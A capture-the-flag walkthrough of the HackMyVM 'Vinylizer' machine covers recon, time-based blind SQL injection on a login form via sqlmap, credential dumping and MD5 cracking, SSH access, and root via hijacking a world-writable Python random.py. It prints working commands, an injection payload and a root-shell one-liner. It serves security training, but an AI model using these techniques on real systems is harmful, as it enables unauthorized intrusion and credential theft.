# Vinylizer

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Vinylizer | MrMidnight | Beginner | HackMyVM |

**Summary:** Vinylizer is a beginner-level vulnerable machine that simulates a vinyl records marketplace web application. The attack path begins with network reconnaissance to identify open services (SSH and HTTP). Web enumeration reveals a login portal vulnerable to SQL injection through the username parameter. Exploiting this time-based blind SQL injection allows extraction of user credentials from the MySQL database. After cracking an MD5 password hash, SSH access is gained as the `shopadmin` user. Privilege escalation is achieved by exploiting a misconfigured Python script that can be executed with sudo privileges, combined with world-writable permissions on the Python `random.py` library file. By hijacking the Python library import mechanism, a malicious payload is executed with root privileges, providing complete system access.

---

## Reconnaissance

### Network Discovery

The initial network scan identified the target machine using a custom PowerShell script that pings the subnet and identifies virtual machines based on MAC address vendor information:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.107 08:00:27:6D:EC:17 VirtualBox
```

The target IP address **192.168.100.107** was confirmed to be a VirtualBox virtual machine.

### Port Scanning & Service Enumeration

A comprehensive Nmap scan was performed to identify all open ports and running services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vinylizer]
└─$ nmap -sC -sV -p- -T4 192.168.100.107
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-13 15:46 WIB
Nmap scan report for 192.168.100.107
Host is up (0.0018s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f8:e3:79:35:12:8b:e7:41:d4:27:9d:97:a5:14:b6:16 (ECDSA)
|_  256 e3:8b:15:12:6b:ff:97:57:82:e5:20:58:2d:cb:55:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Vinyl Records Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.23 seconds
```

**Key Findings:**
- **Port 22 (SSH)**: OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 - Updated version with no known critical vulnerabilities
- **Port 80 (HTTP)**: Apache httpd 2.4.52 running on Ubuntu - Hosting a web application titled "Vinyl Records Marketplace"
- **OS Detection**: Ubuntu Linux (22.04 Jammy based on Apache version)

### HTTP Service Investigation

An HTTP header inspection was performed to gather additional information about the web server:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vinylizer]
└─$ curl -I http://192.168.100.107
HTTP/1.1 200 OK
Date: Fri, 13 Feb 2026 08:50:41 GMT
Server: Apache/2.4.52 (Ubuntu)
Last-Modified: Sat, 20 Jan 2024 13:55:48 GMT
ETag: "916-60f60f431ef12"
Accept-Ranges: bytes
Content-Length: 2326
Vary: Accept-Encoding
Content-Type: text/html
```

The server responds with standard Apache headers. The `Last-Modified` date indicates the site was last updated on **January 20, 2024**.

### Web Application Analysis

Accessing the web application through a browser revealed a marketplace for vinyl records:

![](image.png)

The homepage displays a professional-looking vinyl records marketplace with featured products and navigation menu.

#### Source Code Examination

Inspecting the HTML source code revealed important endpoints and functionality:

```html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <title>Vinyl Records Marketplace</title>
</head>
<body>

<header>
    <h1>Vinylizer Records Marketplace</h1>
    <nav>
        <ul>
            <li><a href="#">Home</a></li>
            <li><a href="#featured-products">Vinyl Records</a></li>
            <li><a href="login.php">Login</a></li>
            <li><a href="#contact">Contact</a></li>
        </ul>
    </nav>
</header>

<section id="featured-products">
    <h2>Featured Vinyl Records</h2>

    <!-- Sample Vinyl Record Listing 1 -->
    <div class="product-card">
        <img src="img/vinyl1.png" alt="Vinyl Record 1">
        <h3>Lofi Dreams</h3>
        <p>The team at Chill Beats is proud to announce our first-ever vinyl record runoff to accompany the release of our first compilation record, Chill Beats Presents: Lofi Dreams. This record represents the work of dozens of talented artists and creators which we are absolutely privileged to share with you for the first time in this special way. - Chill Beats</p>
        <p>Price: $59.99</p>
        <button>Add to Cart</button>
    </div>

    <!-- Sample Vinyl Record Listing 2 -->
    <div class="product-card">
        <img src="img/vinyl2.png" alt="Vinyl Record 2">
        <h3>2 Am. Study Session</h3>
        <p>After the successful launch of the Study Session vinyl compilation series in December 2019, we are proud to present to you the next one: 2AM. Study Session! Like the first release, this one features 25 carefully selected beats from various talented artists around the world. With beautiful study girl artwork and pink colored vinyl, this is aimed to heighten your focus, calm your nerves, and help you chill 😇 - Lofi Records</p>
        <p>Price: $24.99</p>
        <button>Add to Cart</button>
    </div>

    <!-- Add more vinyl record listings as needed -->

</section>

<section id="contact">
    <h2>Contact Us</h2>
    <p>If you have any questions, feel free to contact us:</p>
    <p>Email: info@vinylizer-marketplace.com</p>
    <p>Phone: +1 (555) 123-4567</p>
</section>



<footer>
    <p>&copy; 2024 Vinylizer Records Marketplace. All rights reserved.</p>
</footer>

</body>
</html>
```

**Notable Discoveries:**
- **Login endpoint**: `login.php` - A potential authentication mechanism that could be vulnerable
- **Image resources**: `img/vinyl1.png` and `img/vinyl2.png` 
- **Contact information**: Email and phone (likely decorative, but could be used for social engineering)

### Directory and File Enumeration

Feroxbuster was used to discover hidden directories and files with common extensions:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vinylizer]
└─$ feroxbuster -u http://192.168.100.107/ -w /usr/share/wordlists/dirb/common.txt -x php,bak,txt,old,swp

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.107/
 🚩  In-Scope Url          │ 192.168.100.107
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, bak, txt, old, swp]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       58l      100w     1408c http://192.168.100.107/login.php
200      GET       71l      165w     1290c http://192.168.100.107/styles.css
200      GET     2720l    15392w  1224431c http://192.168.100.107/img/vinyl2.png
200      GET     2566l    16645w  1358084c http://192.168.100.107/img/vinyl1.png
200      GET       63l      263w     2326c http://192.168.100.107/
301      GET        9l       28w      316c http://192.168.100.107/img => http://192.168.100.107/img/
200      GET       63l      263w     2326c http://192.168.100.107/index.html
[####################] - 50s    27738/27738   0s      found:7       errors:1
[####################] - 49s    27684/27684   564/s   http://192.168.100.107/
[####################] - 4s     27684/27684   7042/s  http://192.168.100.107/img/ => Directory listing (add --scan-dir-listings to scan)
```

**Key Findings:**
- **login.php** (1408 bytes) - Primary target for authentication bypass
- **styles.css** - Stylesheet for the application
- **img/** directory - Contains vinyl product images
- **index.html** - Homepage

No backup files (.bak, .old, .swp) or text files were discovered, suggesting good operational security practices or a clean installation.

---

## Initial Access

### SQL Injection Vulnerability Discovery

The login page was identified as the primary attack surface:

![](image-1.png)

#### Manual SQL Injection Testing

Initial testing revealed SQL injection behavior in the username field:

1. **Test 1**: Entering a single quote `'` in the username field with any password resulted in a **blank white page**, indicating a SQL syntax error.
2. **Test 2**: Entering two single quotes `''` in the username field returned the **normal login page**, confirming the input is being processed by SQL without proper sanitization.

This behavior is a clear indicator of **SQL Injection vulnerability** in the username parameter.

### HTTP Request Capture

To facilitate automated exploitation, the login request was captured using a proxy (Burp Suite or browser developer tools):

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vinylizer]
└─$ cat req.txt
POST /login.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: id,en-US;q=0.9,en;q=0.8,id-ID;q=0.7,la;q=0.6
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=up210uomejjgnim8okf7vbue06
Host: 192.168.100.107
Origin: http://192.168.100.107
Referer: http://192.168.100.107/login.php
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36

username=admin&password=admin&login=
```

The POST request includes three parameters:
- **username**: The vulnerable parameter
- **password**: Standard password field
- **login**: Submit button value (empty)

### Automated SQL Injection with SQLMap

#### Database Enumeration

SQLMap was used to automate the SQL injection exploitation process. The first step was to enumerate available databases:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vinylizer]
└─$ sqlmap -r req.txt --batch --dbs
...
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 6699 FROM (SELECT(SLEEP(5)))JkuA) AND 'UgOO'='UgOO&password=admin&login=
---
...
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12
...
available databases [3]:
[*] information_schema
[*] performance_schema
[*] vinyl_marketplace
...
```

**Critical Information Discovered:**
- **Injection Type**: Time-based blind SQL injection
- **Database Engine**: MySQL >= 5.0.12
- **Operating System Confirmed**: Linux Ubuntu 22.04 (jammy)
- **Web Technology**: Apache 2.4.52
- **Target Database**: `vinyl_marketplace` (custom database likely containing user credentials)

The time-based blind SQL injection works by using the MySQL `SLEEP()` function. When the injected payload is true, the server delays its response by 5 seconds, allowing SQLMap to extract data bit by bit.

#### Table Discovery

Next, the tables within the `vinyl_marketplace` database were enumerated:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vinylizer]
└─$ sqlmap -r req.txt --batch -D vinyl_marketplace --tables
...
Database: vinyl_marketplace
[1 table]
+-------+
| users |
+-------+
...
```

Only one table exists: **users** - This is the primary target for credential extraction.

#### Column Enumeration

The structure of the `users` table was examined to identify valuable data columns:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vinylizer]
└─$ sqlmap -r req.txt --batch -D vinyl_marketplace -T users --columns
...
Database: vinyl_marketplace
Table: users
[4 columns]
+----------------+--------------+
| Column         | Type         |
+----------------+--------------+
| id             | int          |
| login_attempts | int          |
| password       | varchar(255) |
| username       | varchar(255) |
+----------------+--------------+
...
```

**Table Schema Analysis:**
- **id**: Primary key for user identification
- **username**: User account names (varchar 255)
- **password**: Stored passwords (varchar 255, likely hashed)
- **login_attempts**: Brute-force protection counter (interesting security feature, but irrelevant for SQL injection)

#### Credential Extraction

The final step was to dump the username and password data from the users table:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vinylizer]
└─$ sqlmap -r req.txt --batch -D vinyl_marketplace -T users -C "id,username,password" --dump
...
Database: vinyl_marketplace
Table: users
[2 entries]
+----+-----------+----------------------------------+
| id | username  | password                         |
+----+-----------+----------------------------------+
| 1  | shopadmin | 943[REDACTED]                    |
| 2  | lana      | password123                      |
+----+-----------+----------------------------------+
...
```

**Credentials Recovered:**
- **User 1**: `shopadmin` with an MD5 hash (32 hexadecimal characters)
- **User 2**: `lana` with a cleartext password `password123`

The `shopadmin` account appears to be an administrative account and is likely to have elevated privileges on the system, making it the primary target.

### Password Cracking

The `shopadmin` password hash was identified as MD5 format based on its 32-character hexadecimal structure. John the Ripper was used with the rockyou wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vinylizer]
└─$ echo "943[REDACTED]" > hash.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vinylizer]
└─$ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
add[REDACTED]   (?)
1g 0:00:00:00 DONE (2026-02-13 16:19) 1.282g/s 13292Kp/s 13292Kc/s 13292KC/s addidas19..addech
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

**Result**: The MD5 hash was successfully cracked in less than a second at a rate of **13.29 million passwords per second**. The password was found in the rockyou wordlist, confirming it's a commonly used weak password.

**Cracked Credentials**:
- Username: `shopadmin`
- Password: `add[REDACTED]`

### SSH Access

With valid credentials, SSH access was attempted on port 22:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vinylizer]
└─$ ssh shopadmin@192.168.100.107
shopadmin@192.168.100.107's password:
...
shopadmin@vinylizer:~$ id
uid=1001(shopadmin) gid=1001(shopadmin) groups=1001(shopadmin)
shopadmin@vinylizer:~$ ls -la
total 36
drwxr-x--- 3 shopadmin shopadmin 4096 Jan 20  2024 .
drwxr-xr-x 4 root      root      4096 Jan 20  2024 ..
-rw------- 1 shopadmin shopadmin   80 Jan 20  2024 .bash_history
-rw-r--r-- 1 shopadmin shopadmin  220 Jan 20  2024 .bash_logout
-rw-r--r-- 1 shopadmin shopadmin 3771 Jan 20  2024 .bashrc
drwx------ 2 shopadmin shopadmin 4096 Jan 20  2024 .cache
-rw-r--r-- 1 shopadmin shopadmin  807 Jan 20  2024 .profile
-rw-rw-r-- 1 shopadmin shopadmin   14 Jan 20  2024 user.txt
-rw------- 1 shopadmin shopadmin  734 Jan 20  2024 .viminfo
```

**Success!** SSH access was granted as the `shopadmin` user. The user flag is available in `user.txt`.

---

## Privilege Escalation

### Sudo Privileges Enumeration

The first privilege escalation check is always to examine sudo permissions:

```bash
shopadmin@vinylizer:~$ sudo -l
Matching Defaults entries for shopadmin on vinylizer:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User shopadmin may run the following commands on vinylizer:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/vinylizer.py
```

**Critical Finding**: The `shopadmin` user can execute `/usr/bin/python3 /opt/vinylizer.py` as root without a password (`NOPASSWD`).

**Analysis of the Sudo Entry**:
- **(ALL : ALL)**: Can be run as any user and any group (effectively root)
- **NOPASSWD**: No password required for execution
- **Fixed Command**: Must execute the exact command `/usr/bin/python3 /opt/vinylizer.py`

The command path is fully qualified, preventing PATH-based hijacking. However, the script itself or its dependencies may be exploitable.

### Script Analysis

Examining the target Python script:

```bash
shopadmin@vinylizer:~$ file /opt/vinylizer.py
/opt/vinylizer.py: Python script, ASCII text executable, with very long lines (404)
shopadmin@vinylizer:~$ ls -la /opt/vinylizer.py
-rw-r--r-- 1 root root 3810 Jan 20  2024 /opt/vinylizer.py
```

The script is owned by root with read-only permissions for non-root users, preventing direct modification.

#### Source Code Review

```python
shopadmin@vinylizer:~$ cat /opt/vinylizer.py
# @Name: Vinylizer
# @Author: MrMidnight
# @Version: 1.8

import json
import random

def load_albums(filename):
    try:
        with open(filename, 'r') as file:
            content = file.read()
            if not content:
                return []
            albums = json.loads(content)
    except FileNotFoundError:
        albums = []
    except json.JSONDecodeError:
        print(f"Error decoding JSON_Config: {filename}.")
        albums = []
    return albums


def save_albums(filename, albums):
    with open(filename, 'w') as file:
        json.dump(albums, file, indent=None)


def print_albums(albums):
    if not albums:
        print("No albums available.")
    else:
        print("Available Albums:")
        for album in albums:
            print(f"- {album['name']}, Sides: {', '.join(album['sides'])}")


def randomize_sides(album):
    sides = list(album['sides'])
    random.shuffle(sides)
    return {"name": album['name'], "sides": sides}


def randomize_vinyl(albums):
    if not albums:
        print("No albums available. Add one with 'A'.")
        return None, None

    random_album = random.choice(albums)
    random_side = random.choice(random_album['sides'])

    return random_album['name'], random_side


def add_vinyl(albums, filename, name, num_sides):
    # Generate sides from A to the specified number
    sides = [chr(ord('A') + i) for i in range(num_sides)]

    # Add new vinyl
    new_album = {"name": name, "sides": sides}
    albums.append(new_album)
    save_albums(filename, albums)
    print(f"Album '{name}' with {num_sides} sides added successfully.\n")


def delete_vinyl(albums, filename, name):
    for album in albums:
        if album['name'] == name:
            albums.remove(album)
            save_albums(filename, albums)
            print(f"Album '{name}' deleted successfully!\n")
            return
    print(f"Album '{name}' not found.")


def list_all(albums):
    print_albums(albums)


if __name__ == "__main__":

    # Banner. Dont touch!
    print("o      'O                  o\nO       o o               O  o\no       O                 o\no       o                 O\nO      O' O  'OoOo. O   o o  O  ooOO .oOo. `OoOo.\n`o    o   o   o   O o   O O  o    o  OooO'  o\n `o  O    O   O   o O   o o  O   O   O      O\n  `o'     o'  o   O `OoOO Oo o' OooO `OoO'  o\nBy: MrMidnight          o\n                     OoO'                         \n")

    config_file = "config.json"

    albums_config = load_albums(config_file)

    while True:
        choice = input("Do you want to (R)andomly choose a Album, (A)dd a new one, (D)elete an album, (L)ist all albums, or (Q)uit? : ").upper()

        if choice == "R":
            random_album, random_side = randomize_vinyl(albums_config)
            if random_album is not None and random_side is not None:
                print(f"Randomly selected album: {random_album}, Random side: {random_side}\n")

        elif choice == "A":
            name = input("\nEnter the name of the new album: ")

            while True:
                try:
                    num_sides = int(input("Enter the number of sides for the new album: "))
                    break  # Break the loop if the input is a integer
                except ValueError:
                    print("\nInvalid input. Please enter a valid integer for the number of sides.")

            add_vinyl(albums_config, config_file, name, num_sides)

        elif choice == "D":
            name = input("\nEnter the name of the album to delete: ")
            delete_vinyl(albums_config, config_file, name)

        elif choice == "L":
            list_all(albums_config)
            print("")

        elif choice == "Q":
            print("\nQuitting Vinylizer.")
            break

        else:
            print("Invalid Input!")
```

**Code Analysis**:
- The script manages a vinyl album collection using JSON storage
- **Critical Import**: `import random` on line 5
- The script uses `random.choice()` and `random.shuffle()` functions
- No obvious command injection or file write vulnerabilities
- The script itself cannot be modified directly

### Python Library Hijacking

The key to privilege escalation lies in Python's import mechanism. When Python imports a module like `random`, it searches for the module file in specific directories, including the system library path `/usr/lib/python3.10/`.

#### Checking Library Permissions

Examining the permissions of Python's standard library directory:

```bash
shopadmin@vinylizer:~$ ls -la /usr/lib/python3.10
total 5076
...
-rw-r--r--  1 root root  11496 Nov 20  2023 queue.py
-rwxr-xr-x  1 root root   7267 Nov 20  2023 quopri.py
-rwxrwxrwx  1 root root  33221 Nov 20  2023 random.py
-rw-r--r--  1 root root   5267 Nov 20  2023 reprlib.py
-rw-r--r--  1 root root  15860 Nov 20  2023 re.py
...
```

**CRITICAL VULNERABILITY IDENTIFIED**: 
```
-rwxrwxrwx  1 root root  33221 Nov 20  2023 random.py
```

The `random.py` library file has **world-writable permissions (777)**. This is an extreme misconfiguration that allows any user to modify the core Python library.

**Exploitation Strategy**:
1. The `vinylizer.py` script imports the `random` module
2. Python will load `/usr/lib/python3.10/random.py` when the import statement executes
3. We can overwrite `random.py` with malicious code
4. When the script is executed with sudo, our malicious code runs as root

### Library Hijacking Exploitation

Overwriting the random.py library with a simple payload to spawn a root shell:

```bash
shopadmin@vinylizer:~$ echo 'import os; os.system("/bin/bash")' > /usr/lib/python3.10/random.py
```

**Payload Explanation**:
- `import os`: Imports Python's operating system interface module
- `os.system("/bin/bash")`: Executes a bash shell with the privileges of the Python process (root)
- The original `random.py` content is completely replaced with this one-liner

### Root Shell

Executing the sudo command triggers the hijacked import:

```bash
shopadmin@vinylizer:~$ sudo /usr/bin/python3 /opt/vinylizer.py
root@vinylizer:/home/shopadmin# id
uid=0(root) gid=0(root) groups=0(root)
```

**SUCCESS!** The moment Python executes `import random`, our malicious code is loaded and executed as root, spawning a root shell.

### Flag Capture

```bash
root@vinylizer:/home/shopadmin# cd
root@vinylizer:~# id ; whoami ; hostname
uid=0(root) gid=0(root) groups=0(root)
root
vinylizer
root@vinylizer:~# cat /home/shopadmin/user.txt /root/root.txt
I[REDACTED]
4[REDACTED]
```

**ROOTED!**

---

## Attack Chain Summary

1. **Reconnaissance**: Performed network scanning to identify target IP 192.168.100.107, followed by comprehensive Nmap service enumeration revealing SSH (port 22) and HTTP (port 80) services running on Ubuntu Linux.

2. **Web Enumeration**: Analyzed the Vinyl Records Marketplace web application, discovering a login portal at `/login.php` through directory enumeration with Feroxbuster and manual source code inspection.

3. **Vulnerability Discovery**: Identified time-based blind SQL injection vulnerability in the `username` parameter of the login form through manual testing with single quotes, confirmed by observing differential responses (blank page vs. normal page).

4. **SQL Injection Exploitation**: Leveraged SQLMap to automatically exploit the time-based blind SQL injection, extracting the database schema and dumping credentials from the `vinyl_marketplace.users` table, recovering two user accounts: `shopadmin` (MD5 hashed password) and `lana` (cleartext password).

5. **Credential Cracking**: Utilized John the Ripper with the rockyou wordlist to crack the `shopadmin` MD5 password hash in under one second, revealing a weak password commonly found in password dictionaries.

6. **Initial Access**: Successfully authenticated to the SSH service using the cracked `shopadmin` credentials, establishing initial foothold on the system as a low-privileged user.

7. **Privilege Enumeration**: Executed `sudo -l` to identify that `shopadmin` can run `/usr/bin/python3 /opt/vinylizer.py` as root without password authentication (NOPASSWD directive).

8. **Vulnerability Analysis**: Analyzed the vinylizer.py script and identified that it imports the `random` module, then discovered that `/usr/lib/python3.10/random.py` has world-writable permissions (777), creating a Python library hijacking opportunity.

9. **Library Hijacking**: Overwrote `/usr/lib/python3.10/random.py` with malicious payload (`import os; os.system("/bin/bash")`) to execute arbitrary commands during the module import phase.

10. **Privilege Escalation**: Executed the sudo-authorized Python script, which loaded the hijacked `random.py` module and triggered the malicious payload, spawning a root shell with UID 0.

11. **Objective Complete**: Retrieved both user and root flags from `/home/shopadmin/user.txt` and `/root/root.txt` respectively, achieving complete system compromise.

